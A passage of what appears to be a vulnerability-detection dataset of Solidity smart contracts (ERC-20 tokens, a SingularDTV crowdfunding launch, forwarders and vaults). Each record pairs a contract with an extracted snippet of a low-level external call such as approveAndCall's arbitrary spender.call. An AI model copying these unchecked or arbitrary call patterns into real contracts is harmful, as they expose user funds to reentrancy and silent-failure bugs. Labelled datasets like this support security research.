}\n function SingularDTVFund() {\n owner = msg.sender;\n }\n function ()\n public\n payable\n {\n if (msg.value == 0) {\n withdrawReward();\n } else {\n depositReward();\n }\n }\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract AbstractSingularDTVFund {\n function softWithdrawRewardFor(address forAddress) returns (uint);\n}\ncontract SingularDTVToken is StandardToken {\n string public version = \"0.1.0\";\n AbstractSingularDTVFund public singularDTVFund;\n string public name;\n string public symbol;\n uint8 public constant decimals = 18;\n function transfer(address to, uint256 value)\n returns (bool)\n {\n singularDTVFund.softWithdrawRewardFor(msg.sender);\n singularDTVFund.softWithdrawRewardFor(to);\n return super.transfer(to, value);\n }\n function transferFrom(address from, address to, uint256 value)\n returns (bool)\n {\n singularDTVFund.softWithdrawRewardFor(from);\n singularDTVFund.softWithdrawRewardFor(to);\n return super.transferFrom(from, to, value);\n }\n function SingularDTVToken(address sDTVFundAddr, address _wallet, string _name, string _symbol, uint _totalSupply) {\n if(sDTVFundAddr == 0 || _wallet == 0) {\n revert();\n }\n balances[_wallet] = _totalSupply;\n totalSupply = _totalSupply;\n name = _name;\n symbol = _symbol;\n singularDTVFund = AbstractSingularDTVFund(sDTVFundAddr);\n Transfer(this, _wallet, _totalSupply);\n }\n}\ncontract AbstractSingularDTVToken is Token {\n}\ncontract SingularDTVLaunch {\n string public version = \"0.1.0\";\n event Contributed(address indexed contributor, uint contribution, uint tokens);\n AbstractSingularDTVToken public singularDTVToken;\n address public workshop;\n address public SingularDTVWorkshop = 0xc78310231aA53bD3D0FEA2F8c705C67730929D8f;\n uint public SingularDTVWorkshopFee;\n uint public CAP;\n uint public DURATION;\n uint public TOKEN_TARGET;\n enum Stages {\n Deployed,\n GoingAndGoalNotReached,\n EndedAndGoalNotReached,\n GoingAndGoalReached,\n EndedAndGoalReached\n }\n address public owner;\n uint public startDate;\n uint public fundBalance;\n uint public valuePerToken;\n uint public tokensSent;\n mapping (address => uint) public contributions;\n mapping (address => uint) public sentTokens;\n Stages public stage = Stages.Deployed;\n modifier onlyOwner() {\n if (msg.sender != owner) {\n revert();\n }\n _;\n }\n modifier atStage(Stages _stage) {\n if (stage != _stage) {\n revert();\n }\n _;\n }\n modifier atStageOR(Stages _stage1, Stages _stage2) {\n if (stage != _stage1 && stage != _stage2) {\n revert();\n }\n _;\n }\n modifier timedTransitions() {\n uint timeElapsed = now - startDate;\n if (timeElapsed >= DURATION) {\n if (stage == Stages.GoingAndGoalNotReached) {\n stage = Stages.EndedAndGoalNotReached;\n } else if (stage == Stages.GoingAndGoalReached) {\n stage = Stages.EndedAndGoalReached;\n }\n }\n _;\n }\n function checkInvariants() constant internal {\n if (fundBalance > this.balance) {\n revert();\n }\n }\n function emergencyCall()\n public\n returns (bool)\n {\n if (fundBalance > this.balance) {\n if (this.balance > 0 && !SingularDTVWorkshop.send(this.balance)) {\n revert();\n }\n return true;\n }\n return false;\n }\n function fund()\n public\n timedTransitions\n atStageOR(Stages.GoingAndGoalNotReached, Stages.GoingAndGoalReached)\n payable\n returns (uint)\n {\n uint tokenCount = (msg.value * (10**18)) / valuePerToken;\n require(tokenCount > 0);\n if (tokensSent + tokenCount > CAP) {\n tokenCount = CAP - tokensSent;\n }\n tokensSent += tokenCount;\n uint contribution = (tokenCount * valuePerToken) / (10**18);\n if (msg.value > contribution && !msg.sender.send(msg.value - contribution)) {\n revert();\n }\n fundBalance += contribution;\n contributions[msg.sender] += contribution;\n sentTokens[msg.sender] += tokenCount;\n if (!singularDTVToken.transfer(msg.sender, tokenCount)) {\n revert();\n }\n if (stage == Stages.GoingAndGoalNotReached) {\n if (tokensSent >= TOKEN_TARGET) {\n stage = Stages.GoingAndGoalReached;\n }\n }\n if (stage == Stages.GoingAndGoalReached) {\n if (tokensSent == CAP) {\n stage = Stages.EndedAndGoalReached;\n }\n }\n checkInvariants();\n Contributed(msg.sender, contribution, tokenCount);\n return tokenCount;\n }\n function withdrawContribution()\n public\n timedTransitions\n atStage(Stages.EndedAndGoalNotReached)\n returns (uint)\n {\n uint tokensReceived = sentTokens[msg.sender];\n sentTokens[msg.sender] = 0;\n if (!singularDTVToken.transferFrom(msg.sender, owner, tokensReceived)) {\n revert();\n }\n uint contribution = contributions[msg.sender];\n contributions[msg.sender] = 0;\n fundBalance -= contribution;\n if (contribution > 0) {\n msg.sender.transfer(contribution);\n }\n checkInvariants();\n return contribution;\n }\n function withdrawForWorkshop()\n public\n timedTransitions\n atStage(Stages.EndedAndGoalReached)\n returns (bool)\n {\n uint value = fundBalance;\n fundBalance = 0;\n require(value > 0);\n uint networkFee = value * SingularDTVWorkshopFee / 100;\n workshop.transfer(value - networkFee);\n SingularDTVWorkshop.transfer(networkFee);\n uint remainingTokens = CAP - tokensSent;\n if (remainingTokens > 0 && !singularDTVToken.transfer(owner, remainingTokens)) {\n revert();\n }\n checkInvariants();\n return true;\n }\n function withdrawUnsentTokensForOwner()\n public\n timedTransitions\n atStage(Stages.EndedAndGoalNotReached)\n returns (uint)\n {\n uint remainingTokens = CAP - tokensSent;\n if (remainingTokens > 0 && !singularDTVToken.transfer(owner, remainingTokens)) {\n revert();\n }\n checkInvariants();\n return remainingTokens;\n }\n function changeValuePerToken(uint valueInWei)\n public\n onlyOwner\n atStage(Stages.Deployed)\n returns (bool)\n {\n valuePerToken = valueInWei;\n return true;\n }\n function updateStage()\n public\n timedTransitions\n returns (Stages)\n {\n return stage;\n }\n function start()\n public\n onlyOwner\n atStage(Stages.Deployed)\n returns (uint)\n {\n if (!singularDTVToken.transferFrom(msg.sender, this, CAP)) {\n revert();\n }\n startDate = now;\n stage = Stages.GoingAndGoalNotReached;\n checkInvariants();\n return startDate;\n }\n function SingularDTVLaunch(\n address singularDTVTokenAddress,\n address _workshop,\n address _owner,\n uint _total,\n uint _unit_price,\n uint _duration,\n uint _threshold,\n uint _singulardtvwoskhop_fee\n ) {\n singularDTVToken = AbstractSingularDTVToken(singularDTVTokenAddress);\n workshop = _workshop;\n owner = _owner;\n CAP = _total;\n valuePerToken = _unit_price;\n DURATION = _duration;\n TOKEN_TARGET = _threshold;\n SingularDTVWorkshopFee = _singulardtvwoskhop_fee;\n }\n function ()\n public\n payable\n {\n if (stage == Stages.GoingAndGoalNotReached || stage == Stages.GoingAndGoalReached)\n fund();\n else if (stage == Stages.EndedAndGoalNotReached)\n withdrawContribution();\n else\n revert();\n }\n}\ncontract TokitDeployer is Ownable {\n TokitRegistry public registry;\n mapping (uint8 => AbstractPaymentEscrow) public paymentContracts;\n event DeployedToken(address indexed _customer, uint indexed _projectId, address _token, address _fund);\n event DeployedCampaign(address indexed _customer, uint indexed _projectId, address _campaign);\n function TokitDeployer(address _owner, address _registry) {\n transferOwnership(_owner);\n registry = TokitRegistry(_registry);\n }\n function deployToken(\n address _customer, uint _projectId, uint8 _payedWith, uint _amountNeeded,\n address _wallet, string _name, string _symbol, uint _totalSupply\n )\n onlyOwner()\n {\n require(AbstractPaymentEscrow(paymentContracts[_payedWith]).getDeposit(_projectId) >= _amountNeeded);\n var (t,,) = registry.lookup(_customer, _projectId);\n require(t == address(0));\n SingularDTVFund fund = new SingularDTVFund();\n SingularDTVToken token = new SingularDTVToken(fund, _wallet, _name, _symbol, _totalSupply);\n fund.setup(token);\n registry.register(_customer, _projectId, token, fund);\n DeployedToken(_customer, _projectId, token, fund);\n }\n function deployCampaign(\n address _customer, uint _projectId,\n address _workshop, uint _total, uint _unitPrice, uint _duration, uint _threshold, uint _networkFee\n )\n onlyOwner()\n {\n var (t,f,c) = registry.lookup(_customer, _projectId);\n require(c == address(0));\n require(t != address(0) && f != address(0));\n SingularDTVLaunch campaign = new SingularDTVLaunch(t, _workshop, _customer, _total, _unitPrice, _duration, _threshold, _networkFee);\n registry.register(_customer, _projectId, campaign);\n DeployedCampaign(_customer, _projectId, campaign);\n }\n function setRegistryContract(address _registry)\n onlyOwner()\n {\n registry = TokitRegistry(_registry);\n }\n function setPaymentContract(uint8 _paymentType, address _paymentContract)\n onlyOwner()\n {\n paymentContracts[_paymentType] = AbstractPaymentEscrow(_paymentContract);\n }\n function deletePaymentContract(uint8 _paymentType)\n onlyOwner()\n {\n delete paymentContracts[_paymentType];\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1655"
  },
  "filename": "43775.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract LuckyEthereumLotteryToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n uint256 public unitsOneEthCanBuy;\n uint256 public totalEthInWei;\n address public fundsWallet;\n function LuckyEthereumLotteryToken() {\n balances[msg.sender] = 900000000;\n totalSupply = 900000000;\n name = \"LuckyEthereumLotteryToken\";\n decimals = 0;\n symbol = \"LELT\";\n unitsOneEthCanBuy = 10000;\n fundsWallet = msg.sender;\n }\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n Transfer(fundsWallet, msg.sender, amount);\n fundsWallet.transfer(msg.value);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1656"
  },
  "filename": "43786.sol",
  "content": "pragma solidity ^0.4.15;\ncontract ERC20 {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract Token is ERC20 {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract CJXToken is Token {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'CJX0.1';\n function CJXToken() {\n balances[msg.sender] = 1000000000000000000000000;\n totalSupply = 1000000000000000000000000;\n name = \"CJX COIN\";\n decimals = 18;\n symbol = \"CJX\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1657"
  },
  "filename": "43896.sol",
  "content": "pragma solidity ^0.4.11;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n bool public disabled = false;\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (disabled != true && balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (disabled != true && balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract NexxusToken is StandardToken {\n function () {return;}\n string public name = \"Nexxus\";\n uint8 public decimals = 8;\n string public symbol = \"NXX\";\n address public owner;\n function NexxusToken() {\n totalSupply = 31800000000000000;\n owner = msg.sender;\n balances[owner] = totalSupply;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { return; }\n return true;\n }\n function mintToken(uint256 _amount) {\n if (msg.sender == owner) {\n totalSupply += _amount;\n balances[owner] += _amount;\n Transfer(0, owner, _amount);\n }\n }\n function disableToken(bool _disable) {\n if (msg.sender == owner)\n disabled = _disable;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { return; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1658"
  },
  "filename": "44307.sol",
  "content": "pragma solidity ^0.4.0;\ncontract Callee{\n uint data = 10;\n function increaseData(uint _val) public returns (uint){\n return data += _val;\n }\n function getData() public view returns (uint){\n return data;\n }\n}\ncontract Caller{\n function callCallee(address _addr) public returns(bool){\n bytes4 methodId = bytes4(keccak256(\"increaseData(uint256)\"));\n return _addr.call(methodId, 1);\n }\n}",
  "extract_feature": [
    "function callCallee(address _addr) public returns(bool){\nbytes4 methodId = bytes4(keccak256(\"increaseData(uint256)\"));\nreturn _addr.call(methodId, 1);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1659"
  },
  "filename": "44345.sol",
  "content": "pragma solidity ^0.5.0;\nimport { ERC1155TokenReceiver } from \"../contracts/ERC1155/ERC1155TokenReceiver.sol\";\ncontract Forwarder is ERC1155TokenReceiver {\n function call(address to, bytes calldata data) external {\n (bool success, bytes memory retData) = to.call(data);\n require(success, string(retData));\n }\n function onERC1155Received(\n address ,\n address ,\n uint256 ,\n uint256 ,\n bytes calldata\n )\n external\n returns(bytes4)\n {\n return this.onERC1155Received.selector;\n }\n function onERC1155BatchReceived(\n address ,\n address ,\n uint256[] calldata ,\n uint256[] calldata ,\n bytes calldata\n )\n external\n returns(bytes4)\n {\n return this.onERC1155BatchReceived.selector;\n }\n}",
  "extract_feature": [
    "function call(address to, bytes calldata data) external {\n(bool success, bytes memory retData) = to.call(data);\nrequire(success, string(retData));\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb165a"
  },
  "filename": "44452.sol",
  "content": "pragma solidity ^0.4.25;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve (address _spender, uint256 _value) public returns (bool success) {}\n function allowance (address _owner, address _spender) public constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer (address _to, uint256 _value) public returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom (address _from, address _to, uint256 _value) public returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf (address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve (address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance (address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'SMT1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000000;\n totalSupply = 1000000000000;\n name = \"Slot Token\";\n decimals = 0;\n symbol = \"SMT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb165b"
  },
  "filename": "44468.sol",
  "content": "pragma solidity >=0.4.23 <0.6.0;\nimport \"./interfaces/ERC20Interface.sol\";\nimport \"./Mocks/SafeMath.sol\";\ncontract RedpacketVault {\n using SafeMath for uint256;\n ERC20Interface private erc20;\n address public erc20Address;\n uint256 public totalAmount = 0;\n uint256 public totalBalance = 0;\n struct Commitment {\n uint256 status;\n uint256 amount;\n address payable sender;\n uint256 timestamp;\n string memo;\n address[] takenAddresses;\n uint256 withdrawTimes;\n uint256 cliff;\n }\n mapping(bytes32 => Commitment) private commitments;\n address public operator;\n address public redpacketManagerAddress;\n event RedPacketDeposit(address indexed sender, bytes32 indexed hashKey, uint256 amount, uint256 timestamp);\n event RedPacketWithdraw(address indexed sender, address indexed recipient, bytes32 indexed hashKey, uint256 amount, uint256 timestamp);\n function sendRedpacketDepositEvent(address _sender, bytes32 _hashkey, uint256 _amount, uint256 _timestamp) external onlyRedpacketManager {\n emit RedPacketDeposit(_sender, _hashkey, _amount, _timestamp);\n }\n function sendRedpacketWithdrawEvent(address _sender, address _recipient, bytes32 _hashkey, uint256 _amount, uint256 _timestamp) external onlyRedpacketManager {\n emit RedPacketWithdraw(_sender, _recipient, _hashkey, _amount, _timestamp);\n }\n modifier onlyOperator {\n require(msg.sender == operator, \"Only operator can call this function.\");\n _;\n }\n modifier onlyRedpacketManager {\n require(msg.sender == redpacketManagerAddress, \"Only redpacket manager contract can call this function.\");\n _;\n }\n constructor(address _erc20Address) public {\n operator = msg.sender;\n erc20Address = _erc20Address;\n erc20 = ERC20Interface(erc20Address);\n }\n function setStatus(bytes32 _hashkey, uint256 _status) external onlyRedpacketManager {\n commitments[_hashkey].status = _status;\n }\n function setAmount(bytes32 _hashkey, uint256 _amount) external onlyRedpacketManager {\n commitments[_hashkey].amount = _amount;\n }\n function setSender(bytes32 _hashkey, address payable _sender) external onlyRedpacketManager {\n commitments[_hashkey].sender = _sender;\n }\n function setTimestamp(bytes32 _hashkey, uint256 _timestamp) external onlyRedpacketManager {\n commitments[_hashkey].timestamp = _timestamp;\n }\n function setMemo(bytes32 _hashkey, string calldata _memo) external onlyRedpacketManager {\n commitments[_hashkey].memo = _memo;\n }\n function setWithdrawTimes(bytes32 _hashkey, uint256 _times) external onlyRedpacketManager {\n commitments[_hashkey].withdrawTimes = _times;\n }\n function setCliff(bytes32 _hashkey, uint256 _cliff) external onlyRedpacketManager {\n commitments[_hashkey].cliff = _cliff;\n }\n function initTakenAddresses(bytes32 _hashkey) external onlyRedpacketManager {\n commitments[_hashkey].takenAddresses = new address[](0);\n }\n function isTaken(bytes32 _hashkey, address _address) external view returns(bool) {\n bool has = false;\n for(uint256 i = 0; i < commitments[_hashkey].takenAddresses.length; i++) {\n if(_address == commitments[_hashkey].takenAddresses[i]) {has = true; break;}\n }\n return has;\n }\n function addTakenAddress(bytes32 _hashkey, address _address) external onlyRedpacketManager {\n commitments[_hashkey].takenAddresses.push(_address);\n }\n function getStatus(bytes32 _hashkey) external view onlyRedpacketManager returns(uint256) {\n return commitments[_hashkey].status;\n }\n function getAmount(bytes32 _hashkey) external view onlyRedpacketManager returns(uint256) {\n return commitments[_hashkey].amount;\n }\n function getSender(bytes32 _hashkey) external view onlyRedpacketManager returns(address payable) {\n return commitments[_hashkey].sender;\n }\n function getTimestamp(bytes32 _hashkey) external view onlyRedpacketManager returns(uint256) {\n return commitments[_hashkey].timestamp;\n }\n function getMemo(bytes32 _hashkey) external view onlyRedpacketManager returns(string memory) {\n return commitments[_hashkey].memo;\n }\n function getWithdrawTimes(bytes32 _hashkey) external view onlyRedpacketManager returns(uint256) {\n return commitments[_hashkey].withdrawTimes;\n }\n function getCliff(bytes32 _hashkey) external view onlyRedpacketManager returns(uint256) {\n return commitments[_hashkey].cliff;\n }\n function updateOperator(address _operator) external onlyOperator {\n operator = _operator;\n }\n function updateRedpacketManagerAddress(address _redpacketManager, uint256 _allowance) external onlyOperator returns(bool) {\n redpacketManagerAddress = _redpacketManager;\n safeApprove(erc20Address, _redpacketManager, _allowance);\n return true;\n }\n function getRedpacketAllowance() external view returns(uint256) {\n return erc20.allowance(address(this), redpacketManagerAddress);\n }\n function addTotalAmount(uint256 _amount) external onlyRedpacketManager {\n totalAmount = totalAmount.add(_amount);\n }\n function addTotalBalance(uint256 _amount) external onlyRedpacketManager {\n totalBalance = totalBalance.add(_amount);\n }\n function subTotalBalance(uint256 _amount) external onlyRedpacketManager {\n totalBalance = totalBalance.sub(_amount);\n }\n function safeApprove(address token, address to, uint value) internal {\n (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));\n require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');\n }\n}",
  "extract_feature": [
    "function safeApprove(address token, address to, uint value) internal {\n(bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));\nrequire(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb165c"
  },
  "filename": "44513.sol",
  "content": "pragma solidity >=0.4.23 <0.6.0;\nimport \"./interfaces/ERC20Interface.sol\";\nimport \"./Mocks/SafeMath.sol\";\ncontract Vault {\n using SafeMath for uint256;\n ERC20Interface private erc20;\n address public erc20Address;\n uint256 public totalAmount = 0;\n uint256 public totalBalance = 0;\n struct Commitment {\n uint256 status;\n uint256 amount;\n address payable sender;\n uint256 effectiveTime;\n uint256 timestamp;\n uint256 canEndorse;\n uint256 lockable;\n uint256 params1;\n uint256 params2;\n uint256 params3;\n address params4;\n }\n mapping(bytes32 => Commitment) private commitments;\n address public operator;\n address public shakerContractAddress;\n address public disputeManagerAddress;\n event Deposit(address indexed sender, bytes32 indexed hashkey, uint256 amount, uint256 timestamp);\n event Withdrawal(string indexed commitment, uint256 fee, uint256 amount, uint256 timestamp);\n function sendDepositEvent(address _sender, bytes32 _hashkey, uint256 _amount, uint256 _timestamp) external onlyShakerAndDisputManager {\n emit Deposit(_sender, _hashkey, _amount, _timestamp);\n }\n function sendWithdrawEvent(string calldata _commitment, uint256 _fee, uint256 _amount, uint256 _timestamp) external onlyShakerAndDisputManager {\n emit Withdrawal(_commitment, _fee, _amount, _timestamp);\n }\n modifier onlyOperator {\n require(msg.sender == operator, \"Only operator can call this function.\");\n _;\n }\n modifier onlyShakerAndDisputManager {\n require(msg.sender == shakerContractAddress || msg.sender == disputeManagerAddress, \"Only bitcheck contract or dispute manager can call this function.\");\n _;\n }\n constructor(address _erc20Address) public {\n operator = msg.sender;\n erc20Address = _erc20Address;\n erc20 = ERC20Interface(erc20Address);\n }\n function setStatus(bytes32 _hashkey, uint256 _status) external onlyShakerAndDisputManager {\n commitments[_hashkey].status = _status;\n }\n function setAmount(bytes32 _hashkey, uint256 _amount) external onlyShakerAndDisputManager {\n commitments[_hashkey].amount = _amount;\n }\n function setSender(bytes32 _hashkey, address payable _sender) external onlyShakerAndDisputManager {\n commitments[_hashkey].sender = _sender;\n }\n function setEffectiveTime(bytes32 _hashkey, uint256 _effectiveTime) external onlyShakerAndDisputManager {\n commitments[_hashkey].effectiveTime = _effectiveTime;\n }\n function setTimestamp(bytes32 _hashkey, uint256 _timestamp) external onlyShakerAndDisputManager {\n commitments[_hashkey].timestamp = _timestamp;\n }\n function setCanEndorse(bytes32 _hashkey, uint256 _canEndorse) external onlyShakerAndDisputManager {\n commitments[_hashkey].canEndorse = _canEndorse;\n }\n function setLockable(bytes32 _hashkey, uint256 _lockable) external onlyShakerAndDisputManager {\n 